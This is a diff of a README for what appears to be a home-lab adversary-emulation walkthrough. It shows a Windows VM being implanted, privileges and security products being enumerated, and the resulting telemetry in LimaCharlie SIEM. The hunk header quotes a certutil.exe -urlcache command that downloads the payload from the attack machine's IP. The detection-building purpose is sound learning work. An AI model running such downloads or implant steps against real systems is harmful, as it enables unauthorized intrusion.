@@ -77,8 +77,8 @@ Executing the command _'certutil.exe -f -urlcache http://192.168.247.129/GOOD_TW
 
 ![We are In!](https://github.com/user-attachments/assets/299b4831-809b-474f-8e88-d56db49344c5)
 
-#### Now that we have a live session between the two machines, the attack machine can begin peeking around, checking priveleges, getting host information, and checking what type of security the host has.
-Using _'getprivs'_ and _'ps -T'_
+#### Now that we are hosting a live session between the two machines, I input the commands _'info' 'getprivs'_ and _'ps -T'_ to check my remote user privileges, information on the victim machine, and see the specific security products used.
+_In this case my victim machine is using Sysmon64 and Windows Smart Screen_.
 
 ![Inside the Windows machine](https://github.com/user-attachments/assets/0352ae0d-93e0-47cb-ae54-c729b6974974)
 
@@ -86,16 +86,17 @@ Using _'getprivs'_ and _'ps -T'_
 
 ![Identifying running processes in remote system](https://github.com/user-attachments/assets/a5abe060-f99e-404f-a6fa-2422107eb357)
 
+#### We can see processes like _SeDebugPrivilege_ and _SeImpersonatePrivilege_ are Enabled, which means we are logged in as Admin.
 ![Implant admin privs on Windows machine](https://github.com/user-attachments/assets/628cf8ab-4473-40b4-9a46-36a155edf91c)
 
 
-Part 3 - Emulating an adversary for crafting detections
+### Now time to go into Lima Charlie to see the noise!
 
-Now time to go into Lima Charlie to see the noise!
+Using my host machine I click the sensors tab, to see that my Windows machine is online.
 
-Going into the sensors tab, I can see that my windows machine is online
+We can look inside our LimaCharlie SIEM and see telemetry from the attack. We can identify the payload thats running and see the IP its connected to.
 
-On the host machine we can look inside our LimaCharlie SIEM and see telemetry from the attacker. We can identify the payload thats running and see the IP its connected to.
+
 
 We can also use LimaCharlie to scan the hash of the payload through VirusTotal; however, it will be clean since we just created the payload ourselves.
 
